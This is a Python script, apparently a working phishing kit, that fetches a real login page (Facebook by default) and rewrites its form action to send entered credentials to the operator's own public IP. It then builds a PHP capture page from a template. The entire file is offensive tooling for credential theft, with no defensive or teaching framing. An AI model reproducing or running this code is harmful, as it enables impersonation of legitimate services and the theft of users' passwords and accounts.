import requests
import pathlib
import argparse
import re


def main() -> None:
    # Path to the phishing page
    path = str(CWD.joinpath("login.html"))
    try:
        # Attempt to get the legitimate login page source code
        response = requests.get(PAGE)
        data = response.content.decode().split('\n')

        # Find and replace the 'action' and 'method' form attributes
        for i, line in enumerate(data):
            if 'action=' in line:
                lst = line.split()
                for j, expression in enumerate(lst):
                    if 'action=' in expression:
                        lst[j] = f'action="http://{IP}/login.php"'
                    elif 'method=' in expression:
                        lst[j] = 'method="get"'
                data[i] = " ".join(lst)

        # Write the modified source code into the phishing page path
        with open(path, "wb") as f:
            f.write('\n'.join(data).encode())
    except requests.exceptions.RequestException as err:  # The provided link was unreachable
        print(err)

    # Create the php script from existing template
    with open(str(CWD.joinpath("template.php")), "r") as f:
        cont = f.read()
    cont = re.sub("PAGELINK", PAGE, cont)
    with open(str(CWD.joinpath("login.php")), "w") as f:
        f.write(cont)


if __name__ == "__main__":
    # Initialize the parser
    parser = argparse.ArgumentParser(
        description="Description: Python Phishing Login Page Generator"
    )
    # Add parameters positional/optional
    # Get a legitimate login page link, or create a facebook login phishing page by default
    parser.add_argument("login_page", help="Link to a legitimate login page", type=str, default="https://www.facebook.com/")
    # Parse the arguments
    args = parser.parse_args()

    # Global variables
    try:
        IP = ip = requests.get('https://api.ipify.org').text  # Get the host public IPv4 address
    except requests.exceptions.RequestException as err:
        print(f"Error retrieving host public IP address - {err}")
    PAGE = args.login_page  # Legitimate login page link
    CWD = pathlib.Path(__file__).parent  # Current working directory
    main()
